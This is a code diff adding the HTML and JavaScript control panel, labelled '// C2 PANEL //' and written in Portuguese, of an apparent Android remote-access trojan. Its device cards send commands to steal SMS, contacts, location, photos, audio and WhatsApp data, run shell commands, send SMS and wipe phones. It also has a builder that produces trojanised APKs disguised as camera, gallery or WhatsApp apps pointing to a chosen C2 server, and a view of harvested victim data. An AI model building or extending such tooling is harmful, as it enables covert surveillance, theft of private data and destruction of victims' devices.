@@ -1,1 +1,605 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Controlo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* ========== SIDEBAR ========== */
+        .sidebar {
+            width: 220px;
+            min-width: 220px;
+            background: #111;
+            border-right: 1px solid #333;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .sidebar .logo {
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            color: #00ff00;
+            border-bottom: 1px solid #333;
+            padding-bottom: 15px;
+        }
+
+        .sidebar button {
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 13px;
+            letter-spacing: 1px;
+            border-radius: 3px;
+            transition: all 0.2s;
+            text-align: left;
+        }
+
+        .sidebar button:hover {
+            background: #00ff00;
+            color: #000;
+        }
+
+        .sidebar button.active {
+            background: #00ff00;
+            color: #000;
+        }
+
+        .sidebar .logout-link {
+            margin-top: auto;
+            color: #ff0000;
+            text-decoration: none;
+            font-size: 12px;
+            padding: 10px;
+            border: 1px solid #ff0000;
+            border-radius: 3px;
+            text-align: center;
+            transition: all 0.2s;
+        }
+
+        .sidebar .logout-link:hover {
+            background: #ff0000;
+            color: #000;
+        }
+
+        /* ========== MAIN ========== */
+        .main {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            letter-spacing: 2px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: #00ff00;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ========== SECTIONS ========== */
+        .section {
+            display: none;
+            background: #111;
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 5px;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        .section h3 {
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+            font-size: 16px;
+        }
+
+        /* ========== GRID DE DISPOSITIVOS ========== */
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 15px;
+        }
+
+        .device-card {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            padding: 15px;
+            border-radius: 5px;
+            transition: border-color 0.3s;
+        }
+
+        .device-card.online {
+            border-color: #00ff00;
+        }
+
+        .device-card.offline {
+            border-color: #ff0000;
+        }
+
+        .device-card h4 {
+            margin-bottom: 8px;
+            font-size: 15px;
+            color: #fff;
+        }
+
+        .device-card .info {
+            font-size: 11px;
+            margin-bottom: 3px;
+            color: #888;
+            word-break: break-all;
+        }
+
+        .device-card .info span {
+            color: #00ff00;
+        }
+
+        .device-card .actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-top: 12px;
+        }
+
+        .device-card .actions button {
+            padding: 6px 9px;
+            background: transparent;
+            border: 1px solid #555;
+            color: #00ff00;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 10px;
+            border-radius: 3px;
+            transition: all 0.2s;
+        }
+
+        .device-card .actions button:hover {
+            border-color: #00ff00;
+            background: rgba(0, 255, 0, 0.1);
+        }
+
+        .device-card .actions button.danger {
+            color: #ff0000;
+            border-color: #ff0000;
+        }
+
+        .device-card .actions button.danger:hover {
+            background: rgba(255, 0, 0, 0.1);
+            border-color: #ff0000;
+        }
+
+        /* ========== FORMULÁRIOS ========== */
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            color: #00ff00;
+            font-family: inherit;
+            font-size: 13px;
+            border-radius: 3px;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #00ff00;
+        }
+
+        .btn-primary {
+            padding: 12px 20px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 1px;
+            border-radius: 3px;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #00cc00;
+        }
+
+        /* ========== LOGS ========== */
+        .log-output {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            padding: 15px;
+            height: 400px;
+            overflow-y: auto;
+            font-size: 11px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border-radius: 3px;
+        }
+
+        .log-entry {
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #222;
+        }
+
+        .log-time {
+            color: #666;
+            font-size: 10px;
+        }
+
+        .log-type {
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        /* ========== MENSAGENS ========== */
+        .empty-msg {
+            color: #666;
+            text-align: center;
+            padding: 30px;
+            font-size: 13px;
+        }
+
+        .error-msg {
+            color: #ff0000;
+            text-align: center;
+            padding: 20px;
+            font-size: 13px;
+        }
+
+        .success-msg {
+            color: #00ff00;
+            text-align: center;
+            padding: 20px;
+            font-size: 13px;
+        }
+
+        /* ========== TOAST ========== */
+        #toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #111;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 12px 20px;
+            border-radius: 5px;
+            font-size: 12px;
+            display: none;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+        <div class="logo">// C2 PANEL //</div>
+        <button class="active" data-section="devices" onclick="showSection('devices')">📱 Dispositivos</button>
+        <button data-section="builder" onclick="showSection('builder')">🔧 Gerar APK</button>
+        <button data-section="logs" onclick="showSection('logs')">📄 Logs</button>
+        <button onclick="loadDevices()">↻ Atualizar</button>
+        <a href="/logout" class="logout-link">SAIR</a>
+    </div>
+
+    <!-- MAIN -->
+    <div class="main">
+        <div class="header">
+            <h1 id="section-title">Dispositivos</h1>
+            <span><span class="status-dot"></span>Ligado</span>
+        </div>
+
+        <!-- SECÇÃO DISPOSITIVOS -->
+        <div id="devices-section" class="section active">
+            <div class="device-grid" id="device-grid">
+                <p class="empty-msg">A carregar dispositivos...</p>
+            </div>
+        </div>
+
+        <!-- SECÇÃO GERADOR APK -->
+        <div id="builder-section" class="section">
+            <h3>Gerar APK Personalizado</h3>
+            <input type="text" id="apk_name" placeholder="Nome da aplicação (ex: CamScanner)">
+            <input type="text" id="c2_url" placeholder="URL do C2 (ex: http://teu-dominio.com)">
+            <select id="icon_type">
+                <option value="camera">📷 Câmara</option>
+                <option value="settings">⚙️ Definições</option>
+                <option value="gallery">🖼️ Galeria</option>
+                <option value="browser">🌐 Navegador</option>
+                <option value="whatsapp">💬 WhatsApp</option>
+            </select>
+            <button class="btn-primary" onclick="generateAPK()">GERAR APK</button>
+            <div id="apk-result"></div>
+        </div>
+
+        <!-- SECÇÃO LOGS -->
+        <div id="logs-section" class="section">
+            <h3>Dados Recolhidos</h3>
+            <select id="log-device-select" onchange="loadLogs()">
+                <option value="">Seleciona dispositivo...</option>
+            </select>
+            <div class="log-output" id="log-output">
+                <p class="empty-msg">Seleciona um dispositivo para ver os dados.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST -->
+    <div id="toast"></div>
+
+    <script>
+        let selectedDevice = null;
+        let refreshInterval = null;
+
+        // ========== NAVEGAÇÃO ==========
+        function showSection(name) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById(name + '-section').classList.add('active');
+
+            document.querySelectorAll('.sidebar button[data-section]').forEach(b => {
+                b.classList.remove('active');
+                if (b.dataset.section === name) b.classList.add('active');
+            });
+
+            const titles = {
+                'devices': 'Dispositivos',
+                'builder': 'Gerar APK',
+                'logs': 'Dados Recolhidos'
+            };
+            document.getElementById('section-title').textContent = titles[name] || name;
+
+            if (name === 'devices') loadDevices();
+            if (name === 'logs') loadDeviceSelect();
+        }
+
+        // ========== TOAST ==========
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+
+        // ========== CARREGAR DISPOSITIVOS ==========
+        async function loadDevices() {
+            const grid = document.getElementById('device-grid');
+            grid.innerHTML = '<p class="empty-msg">A carregar dispositivos...</p>';
+
+            try {
+                const response = await fetch('/api/devices');
+                if (!response.ok) throw new Error('HTTP ' + response.status);
+
+                const devices = await response.json();
+                grid.innerHTML = '';
+
+                if (devices.length === 0) {
+                    grid.innerHTML = '<p class="empty-msg">Nenhum dispositivo ligado.<br>O payload vai conectar-se automaticamente em poucos segundos.</p>';
+                    return;
+                }
+
+                devices.forEach(device => {
+                    const card = document.createElement('div');
+                    card.className = 'device-card ' + device.status;
+
+                    const battery = device.battery_level || 0;
+                    const lastSeen = device.last_seen || 'Desconhecido';
+
+                    card.innerHTML = `
+                        <h4>${escapeHtml(device.model)}</h4>
+                        <p class="info">ID: <span>${device.device_id.substring(0, 12)}...</span></p>
+                        <p class="info">Android: <span>${escapeHtml(device.android_version)}</span></p>
+                        <p class="info">IP: <span>${escapeHtml(device.ip_address || '?')}</span></p>
+                        <p class="info">Bateria: <span>${battery}%</span></p>
+                        <p class="info">Última atividade: <span>${escapeHtml(lastSeen)}</span></p>
+                        <div class="actions">
+                            <button onclick="sendCommand('${device.device_id}', 'get_sms')">SMS</button>
+                            <button onclick="sendCommand('${device.device_id}', 'get_contacts')">Contactos</button>
+                            <button onclick="sendCommand('${device.device_id}', 'get_location')">GPS</button>
+                            <button onclick="sendCommand('${device.device_id}', 'capture_photo')">Foto</button>
+                            <button onclick="sendCommand('${device.device_id}', 'record_audio', '{"duration": 30}')">Áudio</button>
+                            <button onclick="sendCommand('${device.device_id}', 'run_shell', '{"cmd": "id"}')">Shell</button>
+                            <button onclick="sendCommand('${device.device_id}', 'list_files', '{"path": "/sdcard/"}')">Ficheiros</button>
+                            <button onclick="sendCommand('${device.device_id}', 'steal_whatsapp')">WhatsApp</button>
+                            <button onclick="sendCommand('${device.device_id}', 'open_url', '{"url": "https://exemplo.com"}')">Abrir URL</button>
+                            <button onclick="sendCommand('${device.device_id}', 'send_sms', '{"to": "911", "message": "teste"}')">Enviar SMS</button>
+                            <button class="danger" onclick="sendCommand('${device.device_id}', 'wipe_device')">LIMPAR</button>
+                        </div>
+                    `;
+                    grid.appendChild(card);
+                });
+            } catch (e) {
+                grid.innerHTML = '<p class="error-msg">Erro ao carregar: ' + escapeHtml(e.message) + '</p>';
+            }
+        }
+
+        // ========== ENVIAR COMANDO ==========
+        async function sendCommand(deviceId, command, args = '{}') {
+            try {
+                const response = await fetch(`/api/devices/${deviceId}/send_command`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({command: command, arguments: args})
+                });
+
+                if (!response.ok) throw new Error('HTTP ' + response.status);
+
+                const result = await response.json();
+                showToast('Comando enviado: ' + command);
+                console.log('Comando enviado:', result);
+            } catch (e) {
+                showToast('Erro ao enviar comando: ' + e.message);
+                console.error('Erro:', e);
+            }
+        }
+
+        // ========== GERAR APK ==========
+        async function generateAPK() {
+            const apkName = document.getElementById('apk_name').value.trim();
+            const c2Url = document.getElementById('c2_url').value.trim();
+            const iconType = document.getElementById('icon_type').value;
+            const resultDiv = document.getElementById('apk-result');
+
+            if (!apkName || !c2Url) {
+                resultDiv.innerHTML = '<p class="error-msg">Preenche o nome e o URL do C2.</p>';
+                return;
+            }
+
+            resultDiv.innerHTML = '<p class="empty-msg">A gerar APK...</p>';
+
+            try {
+                const response = await fetch('/api/generate_apk', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({apk_name: apkName, c2_url: c2Url, icon_type: iconType})
+                });
+
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    resultDiv.innerHTML = `<p class="success-msg">APK gerado: ${escapeHtml(result.apk_path)}</p>`;
+                    showToast('APK gerado com sucesso!');
+                } else {
+                    resultDiv.innerHTML = `<p class="error-msg">Erro: ${escapeHtml(result.message)}</p>`;
+                }
+            } catch (e) {
+                resultDiv.innerHTML = `<p class="error-msg">Erro: ${escapeHtml(e.message)}</p>`;
+            }
+        }
+
+        // ========== LOGS ==========
+        async function loadDeviceSelect() {
+            const select = document.getElementById('log-device-select');
+            
+            try {
+                const response = await fetch('/api/devices');
+                if (!response.ok) throw new Error('HTTP ' + response.status);
+
+                const devices = await response.json();
+                
+                const currentValue = select.value;
+                select.innerHTML = '<option value="">Seleciona dispositivo...</option>';
+                
+                devices.forEach(device => {
+                    const option = document.createElement('option');
+                    option.value = device.device_id;
+                    option.textContent = device.model + ' (' + device.device_id.substring(0, 8) + '...)';
+                    select.appendChild(option);
+                });
+
+                if (currentValue && devices.some(d => d.device_id === currentValue)) {
+                    select.value = currentValue;
+                    loadLogs();
+                }
+            } catch (e) {
+                console.error('Erro ao carregar dispositivos:', e);
+            }
+        }
+
+        async function loadLogs() {
+            const deviceId = document.getElementById('log-device-select').value;
+            const output = document.getElementById('log-output');
+
+            if (!deviceId) {
+                output.innerHTML = '<p class="empty-msg">Seleciona um dispositivo para ver os dados.</p>';
+                return;
+            }
+
+            output.innerHTML = '<p class="empty-msg">A carregar logs...</p>';
+
+            try {
+                const response = await fetch(`/api/devices/${deviceId}/data`);
+                if (!response.ok) throw new Error('HTTP ' + response.status);
+
+                const data = await response.json();
+
+                if (data.length === 0) {
+                    output.innerHTML = '<p class="empty-msg">Sem dados recolhidos deste dispositivo.</p>';
+                    return;
+                }
+
+                output.innerHTML = '';
+                data.forEach(d => {
+                    const entry = document.createElement('div');
+                    entry.className = 'log-entry';
+                    entry.innerHTML = `
+                        <span class="log-time">[${escapeHtml(d.created_at)}]</span><br>
+                        <span class="log-type">${escapeHtml(d.data_type)}:</span>
+                        <span>${escapeHtml(d.content)}</span>
+                    `;
+                    output.appendChild(entry);
+                });
+            } catch (e) {
+                output.innerHTML = '<p class="error-msg">Erro ao carregar logs.</p>';
+            }
+        }
+
+        // ========== UTILITÁRIOS ==========
+        function escapeHtml(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        // ========== AUTO-REFRESH ==========
+        function startAutoRefresh() {
+            if (refreshInterval) clearInterval(refreshInterval);
+            refreshInterval = setInterval(() => {
+                const activeSection = document.querySelector('.section.active');
+                if (activeSection && activeSection.id === 'devices-section') {
+                    loadDevices();
+                }
+            }, 10000);
+        }
+
+        // ========== INICIALIZAÇÃO ==========
+        loadDevices();
+        startAutoRefresh();
+    </script>
+</body>
+</html>
